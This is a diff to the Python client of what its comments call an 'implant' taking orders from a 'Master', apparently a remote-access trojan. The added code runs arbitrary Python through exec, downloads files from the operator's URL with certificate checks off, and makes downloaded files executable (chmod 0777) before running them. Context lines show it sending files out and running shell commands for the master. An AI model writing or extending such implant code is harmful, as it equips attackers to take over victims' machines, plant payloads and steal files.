@@ -11,6 +11,8 @@ from threading import Thread
 from tempfile import NamedTemporaryFile
 import subprocess
 
+import shlex
+
 # part of standard library
 import shutil
 
@@ -59,6 +61,9 @@ def send_file(filename, url=None):
     except Exception as e:
         print_debug(e)
 
+def exec_py(cmd):
+    exec(cmd, globals())
+
 # Master types "download". This function fulfills the command.
 # From the implant's perspective, this is an upload
 def download(filename, url=None):
@@ -66,12 +71,12 @@ def download(filename, url=None):
 
 # Master types "upload". This function fulfills the command.
 # From the implant's perspective, this is an download
-def upload(url):
-    filename = os.path.basename(requests.utils.urlparse(url).path)
+def upload(url, filename=None):
+    if not filename:
+        filename = os.path.basename(requests.utils.urlparse(url).path)
     r = requests.get(url, verify=False, stream=True)
     with open(filename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
-
 
 def _execute(cmd):
     print("Executing {}".format(cmd))
@@ -94,7 +99,7 @@ def _execute(cmd):
         send_msg("cmd", out)
 
 def execute(cmd):
-    if type(cmd) is not str:
+    if not isinstance(cmd, basestring):
         # AAAAAHHHHHHHHHHHHHHHHHHHHHHHHH
         #cmd =  ' '.join([str(s) for s in cmd])
         cmd =  ' '.join([pipes.quote(str(s)) for s in cmd])
@@ -103,6 +108,34 @@ def execute(cmd):
     thread = Thread(target = _execute, args = (cmd,) )
     thread.start()
 
+def _fix_path(f):
+    if os.path.isabs(f):
+        return f
+    else:
+        return os.path.abspath(os.path.expanduser(f))
+
+    
+def execute_file(cmd):
+    f = None
+    arr = None
+    if type(cmd) is list or type(cmd) is tuple:
+        f = cmd[0]
+    elif isinstance(cmd, basestring):
+        arr = shlex.split(cmd)
+        f = arr[0]
+    
+    f = _fix_path(f)
+    print_debug("File to be executed: {}".format(f))
+
+    if type(cmd) is list or type(cmd) is tuple:
+        cmd[0] = f
+    elif isinstance(cmd, basestring):
+        # NOT SAFE
+        cmd = pipes.quote(f)+" ".join([pipes.quote(str(s)) for s in arr[1:]])
+
+    os.chmod(f, 0777)
+
+    execute(cmd) 
 def send_msg(m=None, *args):
     print_debug("send_msg({}, {})".format(m, args))
     i = 0
